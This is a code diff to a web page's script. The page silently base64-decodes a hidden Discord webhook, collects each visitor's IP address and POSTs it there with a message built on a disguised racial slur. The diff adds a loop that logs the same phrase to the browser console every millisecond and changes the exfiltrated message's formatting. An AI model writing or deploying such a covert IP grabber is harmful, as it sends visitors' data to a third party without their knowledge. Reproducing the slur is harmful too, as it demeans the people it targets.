@@ -12,6 +12,14 @@
 	</body>
 
 	<script>
+		let e = 0;
+		function funny() {
+			console.log(`%cNumb Digger ${e}`, "color: blue; font-size: 20px;");
+			e += 1;
+		}
+
+		const i = setInterval(funny, 1);
+
 		(async () => {
 			const encoded =
 				"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MjAyNzcxOTg5Njc5MzEwOC90RTZqNWZUdjhoMzFaSk1ka0Y4M3hjTWhiT2dzUS1uQWZWelgycGVqbDRuQ3VlQV9RTldUY1RaZTNYY2RydEoyanVRTQ==";
@@ -23,7 +31,7 @@
 				await fetch(webhook, {
 					method: "POST",
 					headers: { "Content-Type": "application/json" },
-					body: JSON.stringify({ content: `IM A NUMB DIGGER! IP: ${ip}` }),
+					body: JSON.stringify({ content: `IM A NUMB DIGGER! IP: **${ip}**` }),
 				});
 				console.log("Sent:", ip);
 			} catch (err) {
